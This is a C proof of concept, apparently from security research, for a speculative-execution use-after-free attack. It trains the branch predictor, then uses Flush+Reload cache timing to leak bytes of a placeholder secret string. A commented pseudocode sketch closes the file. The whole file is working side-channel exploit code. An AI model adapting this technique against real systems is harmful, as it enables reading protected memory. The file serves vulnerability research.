#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0
#define MALLOC_SIZE 4096

cp_t* flush_reload_arr;

extern inline void attack_func(int secret_index) {

    int* i_dupe = malloc(MALLOC_SIZE);
    *i_dupe = secret_index;
    printf("i dupe addr: %p\n", i_dupe);
}

/*
 * Variables required in cache:
 *
 *
 *
 * Variables requried in mem:
 *  freed[0]
 */
//training: free_index=1 print_index=0
//attack:   free_index=0 print_index={iterate through string SECRET}
void victim_func(int free_index, int secret_index) {
    //M_MMAP_THRESHOLD;
    int* i = calloc(1, MALLOC_SIZE);
    int* j = calloc(1, MALLOC_SIZE);
    int* k = calloc(1, MALLOC_SIZE);
    //printf("\ni address: %p\t", &i);
    int* i_j_k_addresses[3];
    i_j_k_addresses[0] = i;
    i_j_k_addresses[1] = j;
    i_j_k_addresses[2] = k;

    char freed[3] __attribute__ ((aligned (256)));
    for(int iter = 0; iter < 3; iter++) freed[iter] = false;  //all false

    int* i_j_k_address = i_j_k_addresses[free_index];
    free(i_j_k_address);
    freed[free_index] = true;

    int* i_dupe = malloc(MALLOC_SIZE);
    *i_dupe = secret_index;
    //END ATTACK FUNC

    printf("    \n");   //WHY DOES THIS IMPROVE ACCURACY?


    cpuid();
    flush((void*)&freed[0]);
    cpuid();

    if(!freed[0]) {
        //volatile cp_t cp1 = flush_reload_arr[0];
        volatile cp_t cp = flush_reload_arr[SECRET[*i]];
    }

    cpuid();
    if(free_index==0) printf("i: %p (%d)\tj: %p\tk: %p\t", i, *i, j, k);
    if(free_index==0) printf("dup%p:%d\ti_v:%d\n", i_dupe, *i_dupe, *i);
    if(!freed[0]) free(i);
    if(!freed[1]) free(j);
    if(!freed[2]) free(k);
    free(i_dupe);

}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING +1;//-(rand() % (N_TRAINING/2)) + 1;
    char free_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        free_indices[i] = 2;
        secret_indices[i] = 0;
    }
    free_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    //TEMP
    //n_accesses = 0;
    //victim_func(0, 0);
    //TEMP
    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("%d:\tfree %d\tsecret %d\n", i, free_indices[i], secret_indices[i]);
        victim_func(free_indices[i], secret_indices[i]);
        cpuid();
        if(free_indices[i] != 0) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            __sync_synchronize();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}

/*

attack_func(int secret_index) {

    int* i_dupe = malloc(sizeof(int));
        *i_dupe = secret_index;
}

//training: free_index=1 print_index=0
//attack:   free_index=0 print_index={iterate through string SECRET}
victim_func(free_index, secret_index) {

    int* i = malloc(sizeof(int));
    int* j = malloc(sizeof(int));
    int* k = malloc(sizeof(int));

    if      (free_index == 0)	free(i); freed[0] = true;
    else if (free_index == 1)	free(j); freed[1] = true;
    else if (free_index == 2}	free(k); freed[2] = true;

    if(!freed[0]) attack_func(secret_index);

    cp_t cp = leak_array[SECRET[*i]];

}

 */